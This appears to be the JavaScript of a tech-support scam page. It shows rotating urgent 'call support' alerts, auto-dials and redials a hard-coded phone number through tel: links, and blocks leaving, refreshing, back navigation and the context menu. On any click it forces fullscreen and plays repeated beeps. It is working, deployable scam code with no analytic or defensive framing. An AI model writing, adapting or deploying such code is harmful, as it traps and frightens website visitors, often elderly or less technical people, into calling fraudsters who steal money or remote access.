// Enhanced configuration
const config = {
    callNumber: '+18044064918',
    alertMessages: [
        {
            title: "Need Immediate Help?",
            message: "Our support team is standing by 24/7 to assist you with any questions or issues.",
            image: "icon.png"
        },
        {
            title: "Technical Support Available",
            message: "Experiencing technical difficulties? Our experts can help resolve them quickly.",
            image: "icon.png"
        },
        {
            title: "Urgent Assistance Required",
            message: "Click to connect with a support representative immediately for urgent matters.",
            image: "icon.png"
        },
        {
            title: "Customer Service Alert",
            message: "Don't struggle alone - our team is ready to help you right now.",
            image: "icon.png"
        },
        {
            title: "Critical Support Notice",
            message: "Your issue is important to us. Contact support now for immediate resolution.",
            image: "icon.png"
        }
    ],
    showInterval: 5000, // 5 seconds between alerts
    maxAlerts: 3, // Maximum alerts to show at once
    alertDuration: 30000, // 30 seconds before auto-dismiss
    preventExit: true, // Prevent user from leaving the page
    forcePortrait: false, // Force portrait mode on mobile
    autoDialDelay: 8000, // 8 seconds before auto-dial
    redialInterval: 30000, // 30 seconds between redial attempts
    beepSound: true, // Enable beep sound
    beepInterval: 1000 // 1 second between beeps
};

// Force portrait mode if enabled
if (config.forcePortrait && window.screen.orientation && window.screen.orientation.lock) {
    try {
        window.screen.orientation.lock('portrait');
    } catch (e) {
        console.log("Orientation lock not supported");
    }
}

// Create and manage alerts
class AlertManager {
    constructor() {
        this.alertStack = document.getElementById('alertStack');
        this.activeAlerts = [];
        this.beepSound = document.getElementById('beepSound');
        this.dialTimer = null;
        this.redialTimer = null;
        this.beepTimer = null;
        this.isAutoDialing = false;
        this.isBeeping = false;
        
        // Initialize
        this.alertCycle();
        setInterval(() => this.alertCycle(), config.showInterval);
        this.setupExitPrevention();
        this.setupInteractionHandlers();
        this.startAutoDial();
    }
    
    createAlert(alertData) {
        const alertDiv = document.createElement('div');
        alertDiv.className = 'bottom-alert';
        alertDiv.innerHTML = `
            <div class="alert-content">
                <div class="alert-image">
                    <img src="${alertData.image}" alt="Support Icon" onerror="this.parentNode.style.background='linear-gradient(135deg, #007AFF, #00A8FF)'; this.parentNode.innerHTML='📞';">
                </div>
                <div class="alert-text">
                    <div class="alert-title">${alertData.title}</div>
                    <div class="alert-message">${alertData.message}</div>
                </div>
            </div>
            <button class="call-button">Call Support Now</button>
        `;
        
        // Add to DOM
        this.alertStack.appendChild(alertDiv);
        
        // Set up call button
        const button = alertDiv.querySelector('.call-button');
        button.addEventListener('click', () => {
            this.playBeepSound();
            this.dialNumber();
            this.removeAlert(alertDiv);
        });
        
        // Show alert with animation
        setTimeout(() => {
            alertDiv.classList.add('show');
        }, 50);
        
        // Auto-dismiss after duration
        const dismissTimer = setTimeout(() => {
            this.removeAlert(alertDiv);
        }, config.alertDuration);
        
        // Track active alert
        this.activeAlerts.push({
            element: alertDiv,
            timer: dismissTimer
        });
        
        // Limit number of alerts
        if (this.activeAlerts.length > config.maxAlerts) {
            this.removeAlert(this.activeAlerts[0].element);
        }
    }
    
    removeAlert(alertDiv) {
        alertDiv.classList.remove('show');
        setTimeout(() => {
            if (alertDiv.parentNode) {
                alertDiv.parentNode.removeChild(alertDiv);
            }
            
            // Remove from active alerts
            this.activeAlerts = this.activeAlerts.filter(alert => alert.element !== alertDiv);
        }, 500);
    }
    
    alertCycle() {
        if (this.activeAlerts.length >= config.maxAlerts) return;
        
        const randomAlert = config.alertMessages[
            Math.floor(Math.random() * config.alertMessages.length)
        ];
        this.createAlert(randomAlert);
    }
    
    setupExitPrevention() {
        if (!config.preventExit) return;
        
        // Prevent page navigation
        window.onbeforeunload = function(e) {
            e.preventDefault();
            e.returnValue = '';
            return 'Are you sure you want to leave? Support is available to help you.';
        };
        
        // Disable context menu
        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
            return false;
        }, {capture: true});
        
        // Block keyboard shortcuts
        document.addEventListener('keydown', function(e) {
            // Block refresh
            if (e.key === 'F5' || 
                (e.ctrlKey && e.key === 'r') || 
                (e.metaKey && e.key === 'r') ||
                (e.key === 'R' && e.shiftKey && e.ctrlKey)) {
                e.preventDefault();
                e.stopPropagation();
                return false;
            }
            
            // Block back navigation
            if (e.key === 'Backspace' && e.target === document.body) {
                e.preventDefault();
                return false;
            }
        }, {capture: true});
        
        // Disable swipe gestures on iOS
        document.addEventListener('touchmove', function(e) {
            if (e.scale !== 1) { e.preventDefault(); }
        }, { passive: false });
    }
    
    setupInteractionHandlers() {
        document.addEventListener('click', this.handleInteraction.bind(this));
        document.addEventListener('touchstart', this.handleInteraction.bind(this));
    }
    
    handleInteraction() {
        this.enterFullscreen();
        this.toggleBeepSound();
    }
    
    enterFullscreen() {
        try {
            const elem = document.documentElement;
            if (elem.requestFullscreen) {
                elem.requestFullscreen();
            } else if (elem.webkitRequestFullscreen) { /* Safari */
                elem.webkitRequestFullscreen();
            } else if (elem.msRequestFullscreen) { /* IE11 */
                elem.msRequestFullscreen();
            }
        } catch (e) {
            console.log("Fullscreen not supported");
        }
    }
    
    toggleBeepSound() {
        if (this.isBeeping) {
            this.stopBeepSound();
        } else {
            this.startBeepSound();
        }
    }
    
    startBeepSound() {
        if (!config.beepSound || !this.beepSound) return;
        
        this.isBeeping = true;
        this.playBeepSound();
        
        // Continue beeping at regular intervals
        this.beepTimer = setInterval(() => {
            this.playBeepSound();
        }, config.beepInterval);
    }
    
    stopBeepSound() {
        this.isBeeping = false;
        if (this.beepTimer) {
            clearInterval(this.beepTimer);
            this.beepTimer = null;
        }
        if (this.beepSound) {
            this.beepSound.pause();
            this.beepSound.currentTime = 0;
        }
    }
    
    playBeepSound() {
        if (this.beepSound) {
            this.beepSound.currentTime = 0;
            this.beepSound.play().catch(e => console.log("Audio play failed:", e));
        }
    }
    
    dialNumber() {
        this.isAutoDialing = true;
        window.location.href = `tel:${config.callNumber}`;
        
        // Clear any existing timers
        if (this.dialTimer) clearTimeout(this.dialTimer);
        if (this.redialTimer) clearTimeout(this.redialTimer);
        
        // Setup redial
        this.redialTimer = setTimeout(() => {
            this.dialNumber();
        }, config.redialInterval);
    }
    
    startAutoDial() {
        // Start auto-dial after the specified delay
        this.dialTimer = setTimeout(() => {
            this.playBeepSound();
            this.dialNumber();
        }, config.autoDialDelay);
    }
}

// Initialize the alert manager when DOM is loaded
document.addEventListener('DOMContentLoaded', () => {
    new AlertManager();
});

// Fallback in case DOMContentLoaded already fired
if (document.readyState !== 'loading') {
    new AlertManager();
}


